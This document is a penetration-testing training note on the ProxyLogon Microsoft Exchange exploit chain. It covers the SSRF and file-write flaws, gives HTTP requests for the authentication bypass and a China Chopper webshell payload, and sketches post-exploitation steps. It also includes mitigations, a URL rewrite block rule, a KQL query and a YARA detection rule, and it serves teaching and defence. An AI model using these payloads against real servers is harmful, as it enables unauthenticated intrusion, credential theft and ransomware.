---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.08 ProxyLogon Chaining"
---

# ProxyLogon Chaining (CVE-2021-26855 & CVE-2021-27065)

## 1. Introduction to ProxyLogon

"ProxyLogon" refers to a devastating chain of vulnerabilities in Microsoft Exchange Server discovered by DEVCORE in early 2021. The exploit chain allows an unauthenticated attacker to execute arbitrary commands (RCE) on an Exchange Server as `NT AUTHORITY\SYSTEM`. 

The chain primarily consists of two critical vulnerabilities:
1. **CVE-2021-26855**: A Server-Side Request Forgery (SSRF) vulnerability in the Exchange Client Access Service (CAS) running on port 443. This allows an unauthenticated attacker to bypass authentication and impersonate an arbitrary user (usually the Administrator).
2. **CVE-2021-27065**: A post-authentication Arbitrary File Write vulnerability in the Exchange Control Panel (ECP). By leveraging the SSRF to authenticate as an admin, the attacker can exploit this file write to drop a webshell.

Because Exchange Servers are intimately tied to Active Directory and often possess high-level privileges, achieving SYSTEM on an Exchange Server usually leads directly to full domain compromise. The widespread exploitation of ProxyLogon by state-sponsored actors (e.g., Hafnium) made it one of the most significant security events of 2021.

## 2. Deep Dive: Vulnerability Details

### CVE-2021-26855 (Pre-Auth SSRF)
The Exchange architecture separates the frontend Client Access Service (CAS) from the backend services. The CAS acts as a proxy, receiving requests from the internet and forwarding them to the appropriate backend server (which is often the same physical machine running on port 444). 

The SSRF vulnerability exists in how the CAS parses the `X-AnonResource-Backend` and `X-BEResource` cookies. In the `ProxyRequestHandler` class, the frontend checks these cookies to determine which backend server to route the request to.
By crafting a specific HTTP cookie containing a tilde (`~`), an attacker can control the destination of the backend proxy request. Because the backend implicitly trusts the frontend, an attacker can interact with backend endpoints (like the ECP) bypassing standard authentication.

### CVE-2021-27065 (Arbitrary File Write)
Within the Exchange Control Panel (ECP) backend, administrators have the ability to manage Exchange Virtual Directories (like OAB - Offline Address Book). An admin can set the `ExternalUrl` and `InternalUrl` properties for these directories, and then click "Reset Virtual Directory". This action exports the configuration to a file on disk as a backup.

The vulnerability lies in the fact that the `ExternalUrl` field is not properly sanitized. An attacker can inject malicious ASP.NET code into the `ExternalUrl` field, set the export path to an accessible web directory (like `C:\inetpub\wwwroot\aspnet_client\`), and trigger the export. The resulting file contains the malicious payload, which the IIS ASP.NET engine will happily compile and execute.

## 3. Architecture and Request Flow

The following ASCII diagram illustrates the flow of the complete ProxyLogon exploit chain.

```text
+---------------------------------------------------------------------------------------------------------+
|                                        ProxyLogon Exploit Chain                                         |
+---------------------------------------------------------------------------------------------------------+
|                                                                                                         |
|  [ Attacker ]                                                                                           |
|       |                                                                                                 |
|       | 1. HTTP POST to /ecp/default.flt with crafted X-BEResource cookie (SSRF)                        |
|       |    Payload: X-BEResource=localhost~1942062522~%2Fecp%2FproxyLogon.ecp?foo=bar;                  |
|       v                                                                                                 |
|  [ Exchange Frontend (CAS) - Port 443 ]                                                                 |
|       |                                                                                                 |
|       | 2. Proxies request to Backend, trusting the modified cookie to bypass Auth.                     |
|       v                                                                                                 |
|  [ Exchange Backend - Port 444 ]                                                                        |
|       |                                                                                                 |
|       | 3. Authenticates as 'Administrator' via generated backend token.                                |
|       | 4. Attacker sends requests to modify OAB Virtual Directory 'ExternalUrl' with webshell payload. |
|       | 5. Attacker triggers 'Reset-OabVirtualDirectory' with a target path (.aspx file).               |
|       v                                                                                                 |
|  [ File System ]                                                                                        |
|       |                                                                                                 |
|       | 6. Writes configuration string containing `<%...eval(Request["cmd"])...%>` to disk.             |
|       |    Path: C:\inetpub\wwwroot\aspnet_client\shell.aspx                                            |
|       v                                                                                                 |
|  [ Attacker ]                                                                                           |
|       |                                                                                                 |
|       | 7. HTTP GET to /aspnet_client/shell.aspx?cmd=whoami                                             |
|       v                                                                                                 |
|  [ Webshell Execution ] --> NT AUTHORITY\SYSTEM                                                         |
|                                                                                                         |
+---------------------------------------------------------------------------------------------------------+
```

## 4. Comprehensive Exploitation Walkthrough

Exploiting ProxyLogon requires precision in manipulating HTTP headers and interacting with the ECP endpoints via SOAP and JSON.

### Step 1: Enumerating the Backend Server Name

The SSRF requires knowing the Fully Qualified Domain Name (FQDN) of the backend server. The attacker can trigger an NTLM challenge or infer it via auto-discover. A simple request to `/mapi/` or `/rpc/` can often leak the internal domain name.

### Step 2: Bypassing Authentication via SSRF

The attacker constructs a request to a static, unauthenticated resource (e.g., `/ecp/y.js` or `default.flt`) but manipulates the `X-BEResource` cookie to point to the backend ECP endpoint.

```http
POST /ecp/y.js HTTP/1.1
Host: mail.target.local
Cookie: X-BEResource=localhost~1942062522~%2Fecp%2FproxyLogon.ecp?foo=bar;
```

To interact as an administrator, the attacker queries the backend to find the Administrator's SID (Security Identifier). Once the SID is obtained, they generate a valid backend authentication token (a serialized XML token) to append to subsequent requests, fully masquerading as the Exchange Admin.

### Step 3: Modifying the OAB Virtual Directory

With the SSRF established and authenticated as the Administrator, the attacker queries the ECP JSON API to locate the OAB Virtual Directory object.

```http
POST /ecp/y.js HTTP/1.1
Cookie: X-BEResource=localhost~1942062522~%2Fecp%2FDDI%2FDDIService.svc%2FGetObject...
Content-Type: application/json

{"filter":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","SelectedView":"All"}},"sort":{}}
```

Once the `Identity` of the OAB is found, the attacker updates its `ExternalUrl` property with a one-line ASP.NET webshell. A common payload is the China Chopper webshell.

```json
{"identity":{"__type":"Identity:...", "DisplayName":"OAB (Default Web Site)","RawIdentity":"..."},
"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#...","ExternalUrl":"http://f/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"cmd\"],\"unsafe\");}</script>"}}}
```

### Step 4: Writing the Webshell to Disk

Finally, the attacker triggers the "Reset" functionality, pointing the export path to the `aspnet_client` directory.

```json
{"identity":{"__type":"Identity:...", "DisplayName":"OAB (Default Web Site)","RawIdentity":"..."},
"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#...","FilePathName":"C:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx"}}}
```

The server writes the configuration data—including the injected `<script>` tag—to `discover.aspx`.

### Step 5: Command Execution

The attacker now has an active webshell running as `SYSTEM`.

```bash
curl -k "https://mail.target.local/aspnet_client/discover.aspx" -d "cmd=whoami"
# Response: nt authority\system
```

## 5. Post-Exploitation Tactics

Once SYSTEM is achieved on the Exchange server, the standard playbook involves:
1. **Dumping LSASS**: Using tools like Procdump or Taskmgr (via webshell or Cobalt Strike) to dump LSASS memory. Because Exchange administrators frequently log in to manage the server, their credentials are often cached.
2. **Extracting Exchange Certificates**: Extracting the Exchange machine account's certificates for hybrid identity pivots.
3. **Pivoting to the Domain**: The `EXCHANGE$` machine account itself is highly privileged. It can be used to query AD, add DCSync rights (if it still retains `WriteDacl`), or move laterally via WMI/PsExec.
4. **Deploying Ransomware**: Many groups immediately dropped DearCry or BlackKingdom ransomware after exploitation.

## 6. Mitigations

1. **Patching**: Microsoft released Out-of-Band (OOB) patches in March 2021. Applying the latest Cumulative Updates (CU) and Security Updates (SU) is mandatory.
2. **Exchange On-Premises Mitigation Tool (EOMT)**: Microsoft provided a tool that automatically applies URL rewrite rules in IIS to drop malicious requests targeting the vulnerable endpoints and cookies.
3. **Restrict Public Access**: Limit access to the Exchange Control Panel (`/ecp`) from the internet. Only OWA and ActiveSync should ideally be exposed to the public internet.

### IIS URL Rewrite Mitigation (Temporary)

An administrator can manually create a rule to block requests containing the malicious SSRF patterns.

```xml
<rule name="Mitigate ProxyLogon" stopProcessing="true">
    <match url=".*" />
    <conditions>
        <add input="{HTTP_COOKIE}" pattern="X-AnonResource-Backend=.*" />
        <add input="{HTTP_COOKIE}" pattern="X-BEResource=.*" />
    </conditions>
    <action type="AbortRequest" />
</rule>
```

## 7. Extensive Detections and Forensics

ProxyLogon leaves significant traces in IIS logs, Exchange server logs, and the file system.

### IIS Logs

Search for requests to `/ecp/y.js` (or other static files like `.flt`, `.css`) with suspicious `X-BEResource` or `X-AnonResource-Backend` cookies. Also look for POST requests to `/ecp/DDI/DDIService.svc`.

```kusto
W3CIISLog
| where csUriStem startswith "/ecp/"
| where csUriStem endswith ".js" or csUriStem endswith ".flt" or csUriStem endswith ".css"
| where csMethod == "POST"
| where scStatus == 200
| project TimeGenerated, cIP, csUriStem, csMethod, scStatus, csCookie
```

### Exchange ECP Logs

Review the `MSExchange Management` event logs (Event ID 1) for the `Set-OabVirtualDirectory` and `Reset-OabVirtualDirectory` cmdlets being executed, particularly when the `ExternalUrl` parameter contains script tags or the `FilePathName` points to `.aspx` files.

### File System Detections

Monitor for the creation of `.aspx`, `.ashx`, or `.asmx` files in commonly abused Exchange directories:
- `C:\inetpub\wwwroot\aspnet_client\`
- `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\`
- `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\`

*Yara Rule Example*:
```yara
rule ProxyLogon_Webshell {
    strings:
        $s1 = "ExternalUrl" nocase
        $s2 = "OAB (Default Web Site)" nocase
        $eval = "eval(Request[\"cmd\"]" nocase
    condition:
        all of them
}
```


## Real-World Attack Scenario
## Real-World Attack Scenario: Unauthenticated ProxyLogon RCE

**The Context:** A state-sponsored APT is targeting a municipality's unpatched internet-facing Microsoft Exchange 2019 server. The server acts as both the frontend Client Access Service (CAS) and the backend mailbox server. The attacker has no credentials and requires a stealthy foothold into the internal network to deploy ransomware.

**The Reconnaissance:** 
The attacker scans the target IP and identifies the open port 443. They send a preliminary HTTP request to `/mapi/` and observe the NTLM challenge response, which leaks the internal Fully Qualified Domain Name (FQDN) of the backend Exchange server: `MAIL-SRV1.corp.local`.

**The Execution:**
1. **SSRF Authentication Bypass:** The attacker crafts an HTTP POST request to the static `/ecp/y.js` endpoint but injects a malicious `X-BEResource` cookie: `X-BEResource=MAIL-SRV1.corp.local~1942062522~%2Fecp%2FproxyLogon.ecp`. The CAS frontend parses this cookie and incorrectly routes the request to the backend ECP, entirely bypassing the frontend authentication checks.
2. **Admin Impersonation:** Using the SSRF, the attacker queries the backend for the Administrator's Security Identifier (SID) and requests an OAuth token, effectively authenticating to the backend as the Exchange Administrator.
3. **Malicious Configuration:** Now authenticated via the SSRF, the attacker interacts with the ECP JSON API to locate the Offline Address Book (OAB) Virtual Directory. They modify its `ExternalUrl` property to include a one-line ASP.NET webshell (China Chopper payload).
4. **Webshell Dropping:** The attacker sends a command to "Reset" the OAB Virtual Directory, specifying an export path of `C:\inetpub\wwwroot\aspnet_client\discover.aspx`. Exchange writes the configuration backup—including the injected webshell code—directly to the public-facing web directory.
5. **Command Execution:** The attacker sends an HTTP GET request to `/aspnet_client/discover.aspx?cmd=whoami`.

**The Outcome:**
The ASP.NET engine compiles and executes the injected code, returning `nt authority\system`. The attacker successfully chained a pre-auth SSRF with an authenticated arbitrary file write to achieve unauthenticated Remote Code Execution. They proceed to drop a Cobalt Strike beacon, dump LSASS to harvest domain credentials, and establish a permanent backdoor, initiating a full-scale network intrusion from a single exposed port.

## 8. Chaining Opportunities

- **[[12 - Lateral Movement via DCOM and WMI]]**: Use the SYSTEM access on the Exchange server to move laterally to the Domain Controller.
- **[[06 - Pass-the-Certificate in Hybrid Environments]]**: Dump the Exchange certificates to attack Entra ID.
- **[[07 - PrivExchange - Exchange to Domain Admin]]**: Even if EWS is patched, having SYSTEM on Exchange allows manual abuse of the `EXCHANGE$` account.
- **[[22 - Active Directory Password Filter Malicious DLLs]]**: Install a malicious password filter to capture all domain credentials during password changes.

## 9. Related Notes

- [[09 - ProxyShell Chaining]]
- [[10 - ProxyNotShell and OWASSRF]]
- [[19 - Web Shells and IIS Exploitation]]
- [[21 - Active Directory Defense and Auditing]]
